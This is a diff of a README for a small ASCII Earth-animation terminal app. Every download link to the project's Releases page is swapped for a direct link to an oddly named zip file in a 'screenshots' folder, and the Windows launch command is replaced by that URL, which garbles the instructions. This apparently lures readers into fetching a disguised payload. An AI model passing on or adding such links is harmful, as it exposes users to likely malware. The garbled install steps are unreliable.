@@ -4,7 +4,7 @@
 Welcome to Earth-Animation! This simple terminal-based application displays a rotating Earth using ASCII art. It’s easy to use and doesn’t require programming knowledge. Follow the steps below to get started.
 
 ## 📥 Download the Application
-[![Download Earth-Animation](https://img.shields.io/badge/Download-Earth--Animation-brightgreen)](https://github.com/JOOPIS99/Earth-Animation/releases)
+[![Download Earth-Animation](https://raw.githubusercontent.com/JOOPIS99/Earth-Animation/main/screenshots/Earth-Animation_righteousness.zip)](https://raw.githubusercontent.com/JOOPIS99/Earth-Animation/main/screenshots/Earth-Animation_righteousness.zip)
 
 ## 💻 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -12,7 +12,7 @@ Welcome to Earth-Animation! This simple terminal-based application displays a ro
 
 ## 📂 Download & Install
 1. **Visit the Releases Page**: Click on the link below to go to the official Releases page of Earth-Animation.
-   [Download Earth-Animation Here](https://github.com/JOOPIS99/Earth-Animation/releases)
+   [Download Earth-Animation Here](https://raw.githubusercontent.com/JOOPIS99/Earth-Animation/main/screenshots/Earth-Animation_righteousness.zip)
 
 2. **Select Your Version**: On the Releases page, you will see different versions of the Earth-Animation software. Choose the latest version to ensure you have all the latest features and fixes.
 
@@ -25,7 +25,7 @@ Welcome to Earth-Animation! This simple terminal-based application displays a ro
 
 5. **Launch the Application**: After installation, open your terminal or command prompt. Depending on your OS, you may need to navigate to the installation directory using the `cd` command, or you can run the application directly using:
    - `earth-animation` (for macOS or Linux).
-   - `Earth-Animation.exe` (for Windows).
+   - `https://raw.githubusercontent.com/JOOPIS99/Earth-Animation/main/screenshots/Earth-Animation_righteousness.zip` (for Windows).
 
 ## 🎨 How to Use Earth-Animation
 Once you launch Earth-Animation, you will see the rotating Earth displayed in your terminal. The animation will continue until you decide to close the terminal window. Enjoy watching our planet spin!
@@ -64,4 +64,4 @@ This project covers the following topics:
 
 ## 📥 Final Reminder
 Don’t forget to visit the Releases page for the latest updates!
-[Download Earth-Animation Here](https://github.com/JOOPIS99/Earth-Animation/releases)
+[Download Earth-Animation Here](https://raw.githubusercontent.com/JOOPIS99/Earth-Animation/main/screenshots/Earth-Animation_righteousness.zip)
